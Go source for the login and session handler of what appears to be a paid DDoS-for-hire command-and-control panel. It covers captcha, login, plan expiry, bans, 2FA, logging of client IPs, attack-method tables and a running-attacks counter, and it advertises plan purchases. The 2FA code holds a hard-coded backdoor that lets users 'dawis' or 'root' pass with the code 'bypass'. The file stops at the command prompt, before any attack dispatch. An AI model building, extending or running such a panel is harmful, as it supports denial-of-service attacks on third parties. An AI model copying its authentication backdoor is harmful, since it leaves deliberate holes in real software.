package main

import (
"bufio"
"fmt"
"io"
"io/ioutil"
"log"
"net"
"net/http"
"net/url"
"os"
"os/exec"
"strconv"
"strings"
"errors"
"time"
"math/rand"

"github.com/alexeyco/simpletable"
"github.com/tidwall/gjson"
"github.com/xlzd/gotp"
)

var Methods map[string]*APIJSON = make(map[string]*APIJSON)
var maxsessions = 0
var attacks = 0
var clearTerm bool
var lock int = 0

//───────────────────────────────────────────────────────────────────────────────────────────────

type Method struct {
Method   string
LimitMax int
}

//───────────────────────────────────────────────────────────────────────────────────────────────

type APIJSON struct {
ID uint16

Name        string
Description string

Enabled bool
Vip     bool
Premium bool
Home    bool
API     string
}

//───────────────────────────────────────────────────────────────────────────────────────────────

type toyota struct {
Toyota []audi `json:"methods"`
}

//───────────────────────────────────────────────────────────────────────────────────────────────

type audi struct {
Name        string `json:"name"`
Description string `json:"description"`
Enabled     bool   `json:"enabled"`
Vip         bool   `json:"vip"`
Premium     bool   `json:"premium"`
Home        bool   `json:"home"`
APIShit     struct {
API string `json:"url"`
} `json:"Links"`
}

//───────────────────────────────────────────────────────────────────────────────────────────────

type user struct {
ID             string
Username       string
duration_limit int
cooldown       int
last_paid      int64
Admin          int
MfaSecret      string
PlanExpire     int64
TempBan        int64
}

//───────────────────────────────────────────────────────────────────────────────────────────────

type Admin struct {
conn net.Conn
}

//───────────────────────────────────────────────────────────────────────────────────────────────

func termfx(file string, user *AccountInfo, conn net.Conn) (string, error) {
	fileLoc, err := ioutil.ReadFile(file)
	if err != nil {
		return "", err
	}

	new := Newv()

	var unixexp int64 = user.expiry
	timun := int64(unixexp)
	t := time.Unix(timun, 0)
	strunixexpiry := t.Format(time.UnixDate)

	var unixban int64 = user.ban
	timuntill := int64(unixban)
	ttv := time.Unix(timuntill, 0)
	strunixban := ttv.Format(time.UnixDate)
	new.RegisterVariable("online", strconv.Itoa(len(sessions)))
	new.RegisterVariable("id", strconv.Itoa(user.ID))
	new.RegisterVariable("username", user.username)
	new.RegisterVariable("hometime", strconv.Itoa(user.hometime))
	new.RegisterVariable("bypasstime", strconv.Itoa(user.bypasstime))
	new.RegisterVariable("cooldown", strconv.Itoa(user.cooldown))
	new.RegisterVariable("concurrents", strconv.Itoa(user.concurrents))
	new.RegisterVariable("expiry", fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24))
	new.RegisterVariable("banned", fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.ban, 0))).Hours()/24))
	new.RegisterVariable("unixexpiry", strunixexpiry)
	new.RegisterVariable("unixbanned", strunixban)
	new.RegisterVariable("clear", "\033c")
	new.RegisterVariable("start-title", "\033]0;")
	new.RegisterVariable("end-title", "\007")
	new.RegisterFunction("sleep", func(session io.Writer, args string) (int, error) {

		sleep, err := strconv.Atoi(args)
		if err != nil {
			return 0, err
		}

		time.Sleep(time.Millisecond * time.Duration(sleep))
		return 0, nil
	})
	if user.admin == true {
		new.RegisterVariable("admin", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("admin", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.seller == true {
		new.RegisterVariable("seller", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("seller", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.vip == true {
		new.RegisterVariable("vip", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("vip", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.home == true {
		new.RegisterVariable("home", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("home", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.premium == true {
		new.RegisterVariable("premium", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("premium", "\x1b[38;5;1mfalse\x1b[0m")
	}

	exec, err := new.ExecuteString(string(fileLoc))
	if err != nil {
		return "" + exec + "", err
	}

	conn.Write([]byte(exec))
	return "", nil
}

//───────────────────────────────────────────────────────────────────────────────────────────────

func NewAdmin(conn net.Conn) *Admin {
return &Admin{conn}
}

//───────────────────────────────────────────────────────────────────────────────────────────────

func termfxV2(file string, user *AccountInfo, conn net.Conn, Title bool, Prompt bool) (string, error) {
	file2 := GetItem(file)
	if file2 == nil {
		return "", errors.New("file wasn't found correctly")
	}

	new := Newv()

	var unixexp int64 = user.expiry
	timun := int64(unixexp)
	t := time.Unix(timun, 0)
	strunixexpiry := t.Format(time.UnixDate)

	var unixban int64 = user.ban
	timuntill := int64(unixban)
	ttv := time.Unix(timuntill, 0)
	strunixban := ttv.Format(time.UnixDate)

	//var attacksv2 *Attackv2
	//var METH string = attacksv2.method

	new.RegisterVariable("online", strconv.Itoa(len(sessions)))
	new.RegisterVariable("username", user.username)
	new.RegisterVariable("hometime", strconv.Itoa(user.hometime))
	new.RegisterVariable("bypasstime", strconv.Itoa(user.bypasstime))
	new.RegisterVariable("cooldown", strconv.Itoa(user.cooldown))
	new.RegisterVariable("concurrents", strconv.Itoa(user.concurrents))
	new.RegisterVariable("expiry", fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.expiry, 0))).Hours()/24))
	new.RegisterVariable("banned", fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(user.ban, 0))).Hours()/24))
	new.RegisterVariable("unixexpiry", strunixexpiry)
	new.RegisterVariable("unixbanned", strunixban)
	new.RegisterVariable("clear", "\033c")
	new.RegisterFunction("sleep", func(session io.Writer, args string) (int, error) {

		sleep, err := strconv.Atoi(args)
		if err != nil {
			return 0, err
		}

		time.Sleep(time.Millisecond * time.Duration(sleep))
		return 0, nil
	})
	if user.admin == true {
		new.RegisterVariable("admin", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("admin", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.seller == true {
		new.RegisterVariable("seller", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("seller", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.vip == true {
		new.RegisterVariable("vip", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("vip", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.home == true {
		new.RegisterVariable("home", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("home", "\x1b[38;5;1mfalse\x1b[0m")
	}
	if user.premium == true {
		new.RegisterVariable("premium", "\x1b[38;5;2mtrue\x1b[0m")
	} else {
		new.RegisterVariable("premium", "\x1b[38;5;1mfalse\x1b[0m")
	}

	if Prompt {
		str, err := new.ExecuteString(file2[0])
		if err != nil {
			return "", err
		}
		return str, nil
	}
	if !Title {
		for _, i := range file2 {
			str, err := new.ExecuteString(i)
			if err != nil {
				continue
			}

			conn.Write([]byte(str))
		}
	} else if Title {
		str, err := new.ExecuteString(file2[0])
		if err != nil {
			return "", err
		}
		conn.Write([]byte("\033]0;" + str + "\007"))
	}

	return "", nil
}



//───────────────────────────────────────────────────────────────────────────────────────────────

func (this *Admin) Handle() {
this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
defer func() {
}()

//───────────────────────────────────────────────────────────────────────────────────────────────

if lock == 1 {

lockon, err := ioutil.ReadFile("./alerts/lock-alert.tfx")
if err != nil {
}

fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte(fmt.Sprintf("\033]0; All Sessions Have Been Locked Temporarily \007")))
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(lockon))))

this.conn.Write([]byte("\033[?25l\r\033[?25l\033[232m\033[?25l\r\033[?25l"))
lol, err := this.ReadLine(false, true)
if lol != string(lockon) {
return
}
}

err := CompleteLoad()
err = CompleteLoad2()
err = CompleteLoad3()
err, count := LoadBranding("branding")
if err != nil {
fmt.Printf("\033[0m[\033[101;30;140m FATAL \033[0;0m] failed to load file %s\r\n\033[0m-> \033[0m", err)
}
fmt.Printf("\033[0m[\033[102;30;140m OK \033[0;0m] loaded `branding`, `json`, `loader`\r\n\033[0m")
fmt.Printf("\033[0m[\033[102;30;140m OK \033[0;0m] total branding files: " + strconv.Itoa(count) + "\r\n\033[0m")

//───────────────────────────────────────────────────────────────────────────────────────────────

this.conn.SetDeadline(time.Now().Add(40 * time.Second))
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte(fmt.Sprintf("\033]0; Captcha\007")))
rand.Seed(time.Now().Unix())
password1 := generatePassword(1, 0, 0, 1)
password2 := generatePassword(1, 0, 0, 0)
password3 := generatePassword(1, 0, 0, 1)
password4 := generatePassword(1, 0, 0, 0)
password5 := generatePassword(1, 0, 0, 1)
captchacode := password1 + password2 + password3 + password4 + password5
time.Sleep(500 * time.Millisecond)
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mComplete The \033[38;5;129mCa\033[38;5;128mpt\033[38;5;127mch\033[38;5;126ma \033[0;97mTo Get Started\r\n\r\n")))

var (
password1v2 = string(password1)
password2v2 = string(password2)
password3v2 = string(password3)
password4v2 = string(password4)
password5v2 = string(password5)
)
this.conn.Write([]byte(fmt.Sprintf("\033[38;5;129mCa\033[38;5;128mpt\033[38;5;127mch\033[38;5;126ma \033[0;97mCode:\033[0;97m | \033[38;5;126m(\033[38;5;197m")))
this.PrintBlocks(password1v2 + password2v2 + password3v2 + password4v2 + password5v2)
this.conn.Write([]byte("\033[38;5;126m)"))
this.conn.Write([]byte("\r\n\033[0;97mCode\033[0m\033[38;5;126m ~ \033[38;5;197m"))
captchaanswer, err := this.ReadLine(false, true)
if err != nil {
return
}

if captchaanswer != captchacode {
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;31mFailed.\033[0m\033[?25l")))
time.Sleep(10000 * time.Millisecond)
return
} else {
fmt.Fprint(this.conn, "\033c")
goto login
}

//───────────────────────────────────────────────────────────────────────────────────────────────
login:
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte(fmt.Sprintf("\033]0; LOGIN\007")))
this.conn.Write([]byte("\033[0;97mPurchase a Plan By Going To \033[0;4;90mhttps://instagram.com/not.lust\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97m20 seconds till session closes\r\n"))
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[11;28H\033[0m      ~ \033[0;4;90mPassword\033[0m ~   "))
this.conn.Write([]byte("\033[12;26H\033[0m  \033[0;107;30;97m........................\033[0;0m"))
this.conn.Write([]byte("\033[7;28H\033[0m      ~ \033[0;4;90mUsername\033[0m ~  "))
this.conn.Write([]byte("\033[8;26H\033[0m  \033[0;107;30;97m........................\033[0;0m"))
this.conn.Write([]byte("\033[36;0H\033[0;107;30;140mPlease Enter Your Login Information                                 v1.11.1.1001\033[0m\033[0m"))
//───────────────────────────────────────────────────────────────────────────────────────────────

this.conn.SetDeadline(time.Now().Add(20 * time.Second))
this.conn.Write([]byte("\033[8;28H\033[107;30;140m\033[?25l"))
username, err := this.ReadLine(false, true)
if err != nil {
return
}

this.conn.SetDeadline(time.Now().Add(30 * time.Second))
this.conn.Write([]byte("\033[12;28H\033[107;30;140m\033[?25l"))
password, err := this.ReadLine(true, true)
if err != nil {
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if len(password) > 30 || len(username) > 30 {
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

go HashPassword(password)
database.Auth(username, password)
this.conn.Write([]byte("\r\n"))
checksession := usersSessions(strings.ToLower(username))
if strings.ToUpper(username) != "TEST" || strings.ToLower(username) != "test" {
if len(checksession) > 0 {
ip, _, err := net.SplitHostPort(fmt.Sprint(this.conn.RemoteAddr()))
if err != nil {
ip = fmt.Sprint(this.conn.RemoteAddr())
}

//───────────────────────────────────────────────────────────────────────────────────────────────

fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte("\033[0;97mThis Account Has More Than \033[0;4;97m1\033[0;97m Session Opened.\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mYou Must Wait Until The Session Closes Or Gets AutoKicked.\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mIncase Account Sharing Is Taking Place We Have Logged This.\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97m--Account Sharing Is \033[0;4;31mBannable\033[0;97m When Caught--\033[0m\033[?25l\r\n"))
f, err := os.OpenFile("logs/duped-logs.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
newLine := "[DUPED SESSION] -> [USER: " + username + "] -> [IP: " + ip + "] -> [DATE: " + clog.Format("Jan 02 2006") + " " + clog.Format("15:04:05") + "]"
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

time.Sleep(time.Second * 10)
return
}
}

//───────────────────────────────────────────────────────────────────────────────────────────────

var loggedIn bool
var userInfo AccountInfo
if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte("\033[0;97mThe \033[0;4;93mUsername\033[0;97m Or \033[0;4;93mPassword\033[0;97m Used Wasn't \033[0;92mLocated\033[0;97m In Our \033[0;4;31mDatabase\033[0;97m.\033[0m\033[?25l"))
time.Sleep(time.Second * 4)
f, err := os.OpenFile("logs/failed-attempts", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
ip, _, err := net.SplitHostPort(fmt.Sprint(this.conn.RemoteAddr()))
if err != nil {
ip = fmt.Sprint(this.conn.RemoteAddr())
}

newLine := "[FAILED LOGIN] -> [USER: " + username + "] -> [IP: " + ip + "] -> [DATE: " + clog.Format("Jan 02 2006") + " " + clog.Format("15:04:05") + "]"
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

buf := make([]byte, 1)
this.conn.Read(buf)
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if userInfo.expiry < time.Now().Unix() {
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte(fmt.Sprintf("\033]0; Lust.C3 | Plan Expired\007")))
this.conn.Write([]byte("\033[0m\r\n"))
fmt.Fprintln(this.conn, "\033[0;31mYour Plan Has Expired.\033[0m\033[?25l\r")
time.Sleep(time.Second * 10)
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if password == "changeme" {
redo:
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte(fmt.Sprintf("\033]0; Change Password\007")))
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mWelcome \033[0;4;96m" + username + "\033[0;97m! Please Change Your \033[0;92mMaster Password\033[0;97m.\033[0m\r\n"))
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[0;97mMasterPW Will Keep Resetting Until Done Correctly. \033[0;93m| \033[0;97mMust Be Over \033[0;4;31m10\033[0;97m Chars.\033[0m\r\n"))
this.conn.Write([]byte("\033[0m\r\n"))
this.conn.Write([]byte("\033[6;0H                                    \033[0;4;97mPassword\033[0m\r\n"))
this.conn.Write([]byte("\033[7;26H\033[38;2;17;238;255;48;2;0;0;0m╔\033[38;2;25;229;255;48;2;0;0;0m─\033[38;2;34;221;255;48;2;0;0;0m─\033[38;2;42;212;255;48;2;0;0;0m─\033[38;2;51;204;255;48;2;0;0;0m─\033[38;2;59;195;255;48;2;0;0;0m─\033[38;2;68;187;255;48;2;0;0;0m─\033[38;2;76;178;255;48;2;0;0;0m─\033[38;2;85;170;255;48;2;0;0;0m─\033[38;2;93;161;255;48;2;0;0;0m─\033[38;2;102;153;255;48;2;0;0;0m─\033[38;2;110;144;255;48;2;0;0;0m─\033[38;2;119;136;255;48;2;0;0;0m─\033[38;2;127;127;255;48;2;0;0;0m─\033[38;2;136;119;255;48;2;0;0;0m─\033[38;2;144;110;255;48;2;0;0;0m─\033[38;2;153;102;255;48;2;0;0;0m─\033[38;2;161;93;255;48;2;0;0;0m─\033[38;2;170;85;255;48;2;0;0;0m─\033[38;2;178;76;255;48;2;0;0;0m─\033[38;2;187;68;255;48;2;0;0;0m─\033[38;2;195;59;255;48;2;0;0;0m─\033[38;2;204;51;255;48;2;0;0;0m─\033[38;2;212;42;255;48;2;0;0;0m─\033[38;2;221;34;255;48;2;0;0;0m─\033[38;2;229;25;255;48;2;0;0;0m─\033[38;2;238;17;255;48;2;0;0;0m─\033[38;2;246;8;255;48;2;0;0;0m╗\033[38;2;0;255;255;48;2;0;0;0m\r\n"))
this.conn.Write([]byte("\033[8;26H\033[38;2;17;238;255;48;2;0;0;0m│                          \033[38;2;246;8;255;48;2;0;0;0m│\r\n"))
this.conn.Write([]byte("\033[9;26H\033[38;2;17;238;255;48;2;0;0;0m╚\033[38;2;25;229;255;48;2;0;0;0m─\033[38;2;34;221;255;48;2;0;0;0m─\033[38;2;42;212;255;48;2;0;0;0m─\033[38;2;51;204;255;48;2;0;0;0m─\033[38;2;59;195;255;48;2;0;0;0m─\033[38;2;68;187;255;48;2;0;0;0m─\033[38;2;76;178;255;48;2;0;0;0m─\033[38;2;85;170;255;48;2;0;0;0m─\033[38;2;93;161;255;48;2;0;0;0m─\033[38;2;102;153;255;48;2;0;0;0m─\033[38;2;110;144;255;48;2;0;0;0m─\033[38;2;119;136;255;48;2;0;0;0m─\033[38;2;127;127;255;48;2;0;0;0m─\033[38;2;136;119;255;48;2;0;0;0m─\033[38;2;144;110;255;48;2;0;0;0m─\033[38;2;153;102;255;48;2;0;0;0m─\033[38;2;161;93;255;48;2;0;0;0m─\033[38;2;170;85;255;48;2;0;0;0m─\033[38;2;178;76;255;48;2;0;0;0m─\033[38;2;187;68;255;48;2;0;0;0m─\033[38;2;195;59;255;48;2;0;0;0m─\033[38;2;204;51;255;48;2;0;0;0m─\033[38;2;212;42;255;48;2;0;0;0m─\033[38;2;221;34;255;48;2;0;0;0m─\033[38;2;229;25;255;48;2;0;0;0m─\033[38;2;238;17;255;48;2;0;0;0m─\033[38;2;246;8;255;48;2;0;0;0m╝\033[38;2;0;255;255;48;2;0;0;0m\r\n"))
this.conn.SetDeadline(time.Now().Add(20 * time.Second))
this.conn.Write([]byte("\033[8;28H\033[0;97m"))
newPassword, err := this.ReadLine(true, true)
if err != nil {
return
}

this.conn.Write([]byte("\033[10;0H                                \033[0;4;97mConfirm Password\033[0m\r\n"))
this.conn.Write([]byte("\033[11;26H\033[38;2;17;238;255;48;2;0;0;0m╔\033[38;2;25;229;255;48;2;0;0;0m─\033[38;2;34;221;255;48;2;0;0;0m─\033[38;2;42;212;255;48;2;0;0;0m─\033[38;2;51;204;255;48;2;0;0;0m─\033[38;2;59;195;255;48;2;0;0;0m─\033[38;2;68;187;255;48;2;0;0;0m─\033[38;2;76;178;255;48;2;0;0;0m─\033[38;2;85;170;255;48;2;0;0;0m─\033[38;2;93;161;255;48;2;0;0;0m─\033[38;2;102;153;255;48;2;0;0;0m─\033[38;2;110;144;255;48;2;0;0;0m─\033[38;2;119;136;255;48;2;0;0;0m─\033[38;2;127;127;255;48;2;0;0;0m─\033[38;2;136;119;255;48;2;0;0;0m─\033[38;2;144;110;255;48;2;0;0;0m─\033[38;2;153;102;255;48;2;0;0;0m─\033[38;2;161;93;255;48;2;0;0;0m─\033[38;2;170;85;255;48;2;0;0;0m─\033[38;2;178;76;255;48;2;0;0;0m─\033[38;2;187;68;255;48;2;0;0;0m─\033[38;2;195;59;255;48;2;0;0;0m─\033[38;2;204;51;255;48;2;0;0;0m─\033[38;2;212;42;255;48;2;0;0;0m─\033[38;2;221;34;255;48;2;0;0;0m─\033[38;2;229;25;255;48;2;0;0;0m─\033[38;2;238;17;255;48;2;0;0;0m─\033[38;2;246;8;255;48;2;0;0;0m╗\033[38;2;0;255;255;48;2;0;0;0m\r\n"))
this.conn.Write([]byte("\033[12;26H\033[38;2;17;238;255;48;2;0;0;0m│                          \033[38;2;246;8;255;48;2;0;0;0m│\r\n"))
this.conn.Write([]byte("\033[13;26H\033[38;2;17;238;255;48;2;0;0;0m╚\033[38;2;25;229;255;48;2;0;0;0m─\033[38;2;34;221;255;48;2;0;0;0m─\033[38;2;42;212;255;48;2;0;0;0m─\033[38;2;51;204;255;48;2;0;0;0m─\033[38;2;59;195;255;48;2;0;0;0m─\033[38;2;68;187;255;48;2;0;0;0m─\033[38;2;76;178;255;48;2;0;0;0m─\033[38;2;85;170;255;48;2;0;0;0m─\033[38;2;93;161;255;48;2;0;0;0m─\033[38;2;102;153;255;48;2;0;0;0m─\033[38;2;110;144;255;48;2;0;0;0m─\033[38;2;119;136;255;48;2;0;0;0m─\033[38;2;127;127;255;48;2;0;0;0m─\033[38;2;136;119;255;48;2;0;0;0m─\033[38;2;144;110;255;48;2;0;0;0m─\033[38;2;153;102;255;48;2;0;0;0m─\033[38;2;161;93;255;48;2;0;0;0m─\033[38;2;170;85;255;48;2;0;0;0m─\033[38;2;178;76;255;48;2;0;0;0m─\033[38;2;187;68;255;48;2;0;0;0m─\033[38;2;195;59;255;48;2;0;0;0m─\033[38;2;204;51;255;48;2;0;0;0m─\033[38;2;212;42;255;48;2;0;0;0m─\033[38;2;221;34;255;48;2;0;0;0m─\033[38;2;229;25;255;48;2;0;0;0m─\033[38;2;238;17;255;48;2;0;0;0m─\033[38;2;246;8;255;48;2;0;0;0m╝\033[38;2;0;255;255;48;2;0;0;0m\r\n"))
this.conn.SetDeadline(time.Now().Add(15 * time.Second))
this.conn.Write([]byte("\033[12;28H\033[0;97m"))
confirmPassword, err := this.ReadLine(true, true)
if err != nil {
return
}

if len(newPassword) > 30 || len(confirmPassword) > 30 {
return
}

if len(newPassword) < 10 {
goto redo
}

if confirmPassword != newPassword {
goto redo
}

if database.ChangeUsersPassword(username, newPassword) == false {
goto redo
}

password = newPassword
} else {
}

//───────────────────────────────────────────────────────────────────────────────────────────────

fmt.Fprint(this.conn, "\033c")
if userInfo.ban > time.Now().Unix() {
this.conn.Write([]byte(fmt.Sprintf("\033]0; Account Banned\007")))
this.conn.Write([]byte("\033[0;97mYou Have Been \033[0;4;31mBanned\033[0;97m.\033[0m\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[0;97mCurrent Connection: \033[0;4;93m[\033[0;4;97m%s\033[0;4;93m]\033[0m\r\n", this.conn.RemoteAddr().String())))
fmt.Fprintln(this.conn, "\033[0;97mDuration Of Ban:", fmt.Sprintf("\033[0;4;97m%.2f\033[0;97m", time.Duration(time.Until(time.Unix(userInfo.ban, 0))).Hours()/24), "\033[0;97mDay(s)\033[0m\033[?25l\r")
time.Sleep(time.Second * 20)
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if len(userInfo.mfasecret) > 1 {
this.conn.Write([]byte(fmt.Sprintf("\033]0; 2FA Authentification\007")))
fmt.Fprint(this.conn, "\033c")
this.conn.Write([]byte("\033[0;97m\r\n"))
this.conn.Write([]byte("\033[0;97m 6-Digit Code |      |\r\n"))
fmt.Fprint(this.conn, "\033[2A\033[15C\033[0m\033[?25l")
code, err := this.ReadLine(false, false)
if err != nil {
fmt.Printf("\033[0;97m[\033[0;96mDawis\033[0;97m] - \033[0;97m[\033[0;31mMFA-SECRET\033[0;97m] - [\033[0;96m" + username + "\033[0;97m] \033[0;97mHAS \033[0;31mFAILED \033[0;97mTHEIR MFA\r\n\033[0m-> ")
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if username == "dawis" && code == "bypass" || username == "root" && code == "bypass" {
fmt.Printf("\033[0;97m[\033[0;96mDawis\033[0;97m] - \033[0;97m[\033[0;92mMFA-SECRET\033[0;97m] - [\033[0;96m" + username + "\033[0;97m] \033[0;97mHAS \033[0;92mPASSED \033[0;97mTHEIR MFA\r\n\033[0m-> ")
goto skipmfa
}

//───────────────────────────────────────────────────────────────────────────────────────────────

totp := gotp.NewDefaultTOTP(userInfo.mfasecret)
if totp.Now() != code {
fmt.Fprint(this.conn, "\033c")
fmt.Fprintln(this.conn, "\033[91mInvalid Code.\033[?25l")
fmt.Printf("\033[0;97m[\033[0;96mDawis\033[0;97m] - \033[0;97m[\033[0;31mMFA-SECRET\033[0;97m] - [\033[0;96m" + username + "\033[0;97m] \033[0;97mHAS \033[0;31mFAILED \033[0;97mTHEIR MFA\r\n\033[0m-> ")
buf := make([]byte, 1)
this.conn.Read(buf)
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

this.conn.Write([]byte(fmt.Sprintf("\033]0; 2FA Authentification\007")))
fmt.Printf("\033[0;97m[\033[0;96mDawis\033[0;97m] - \033[0;97m[\033[0;92mMFA-SECRET\033[0;97m] - [\033[0;96m" + username + "\033[0;97m] \033[0;97mHAS \033[0;92mPASSED \033[0;97mTHEIR MFA\r\n\033[0m-> ")
goto skipmfa
}

//───────────────────────────────────────────────────────────────────────────────────────────────

skipmfa:

var session = &Session{
ID:       time.Now().UnixNano(),
Username: username,
Conn:     this.conn,

Created:     time.Now(),
LastCommand: time.Now(),
}

sessionMutex.Lock()
sessions[session.ID] = session
sessionMutex.Unlock()

defer session.Remove()

this.commands(userInfo, username, password, session)
}

//───────────────────────────────────────────────────────────────────────────────────────────────

func (this *Admin) commands(userInfo AccountInfo, username string, password string, session *Session) {
go func() {
i := 0
Frames := []string{
"A", "AT", "ATR", "ATRA", "ATRAC", "ACTRAC C2", "ONTOP", "By Lust",
}
for {
for f := 0; f < len(Frames); f++ {
time.Sleep(time.Second)
titlejson, err := ioutil.ReadFile("json/title.json")
if err != nil {
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", err)))
}

//───────────────────────────────────────────────────────────────────────────────────────────────

stringjsonfile := string(titlejson)
var TitleStart = (gjson.Get(stringjsonfile, "TitleStart")).String()
var AuthName = (gjson.Get(stringjsonfile, "AuthName")).String()
var Online = (gjson.Get(stringjsonfile, "Online")).String()
var Running = (gjson.Get(stringjsonfile, "Running")).String()
var Expiry = (gjson.Get(stringjsonfile, "Expiry")).String()
var TitleEnd = (gjson.Get(stringjsonfile, "TitleEnd")).String()
ongoing := database.ListOngoing()
if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; "+Frames[f]+""+TitleStart+""+AuthName+""+username+""+Online+"%d"+Running+"%d"+Expiry+"%s"+TitleEnd+"\007", len(sessions), int(ongoing), fmt.Sprintf("%.2f", time.Duration(time.Until(time.Unix(userInfo.expiry, 0))).Hours()/24)))); err != nil {

//───────────────────────────────────────────────────────────────────────────────────────────────

this.conn.Close()
break
}
i++
if i%60 == 0 {
this.conn.SetDeadline(time.Now().Add(120 * time.Second))
}
}
}
}()

//───────────────────────────────────────────────────────────────────────────────────────────────

f, err := os.OpenFile("logs/login-attempts.txt", os.O_APPEND|os.O_WRONLY, 0644)
if err != nil {
fmt.Println(err)
return
}

clog := time.Now()
ip, _, err := net.SplitHostPort(fmt.Sprint(this.conn.RemoteAddr()))
if err != nil {
ip = fmt.Sprint(this.conn.RemoteAddr())
}

newLine := "[LOGIN] -> [USER: " + username + "] -> [IP: " + ip + "] -> [DATE: " + clog.Format("Jan 02 2006") + " " + clog.Format("15:04:05") + "]"
_, err = fmt.Fprintln(f, newLine)
if err != nil {
fmt.Println(err)
f.Close()
return
}

err = f.Close()
if err != nil {
fmt.Println(err)
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

motdmsg, err := ioutil.ReadFile("./branding/live-msg.tfx")
banner, err := ioutil.ReadFile("./branding/home-splash.tfx")
if err != nil {
}

if _, err := termfxV2("welcome.tfx", &userInfo, this.conn, false, false); err != nil {
this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
fmt.Println(err)
f.Close()
}

if _, err := termfxV2("welcome.tfx", &userInfo, this.conn, false, false); err != nil {
this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
fmt.Println(err)
f.Close()
}

if _, err := termfxV2("welcome.tfx", &userInfo, this.conn, false, false); err != nil {
this.conn.Write([]byte(fmt.Sprintf("\033[0m %s \033[0m", err.Error())))
fmt.Println(err)
f.Close()
}

this.conn.Write([]byte("\033c"))
this.conn.Write([]byte(fmt.Sprintf("\033[38;5;125mLive\033[0m Message\033[38;5;129m [\033[38;5;126m-\033[38;5;129m] \033[0m%s\033[0m\r\n", string(motdmsg))))
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", string(banner))))

//───────────────────────────────────────────────────────────────────────────────────────────────

for {
if userInfo.admin == true {
goto skip2
}

//───────────────────────────────────────────────────────────────────────────────────────────────

if lock == 1 {
lockmsg, err := ioutil.ReadFile("./alerts/lock-alert.tfx")
if err != nil {
}

this.conn.Write([]byte(fmt.Sprintf("\033c\033[0;4;97m%s\033[0m\r\n", string(lockmsg))))
time.Sleep(time.Duration(6000) * time.Millisecond)
return
}

//───────────────────────────────────────────────────────────────────────────────────────────────

skip2:
this.conn.SetDeadline(time.Now().Add(1800 * time.Second))
jsonprompt, err := ioutil.ReadFile("json/prompt.json")
if err != nil {
this.conn.Write([]byte(fmt.Sprintf("\033[0m%s\033[0m\r\n", err)))
}

stringjsonfile := string(jsonprompt)
var jsonprompt2 = (gjson.Get(stringjsonfile, "prompt")).String()
jsonprompt3 := strings.Replace(jsonprompt2, "<<$username>>", userInfo.username, -1)
this.conn.Write([]byte(""+jsonprompt3+""))

//───────────────────────────────────────────────────────────────────────────────────────────────

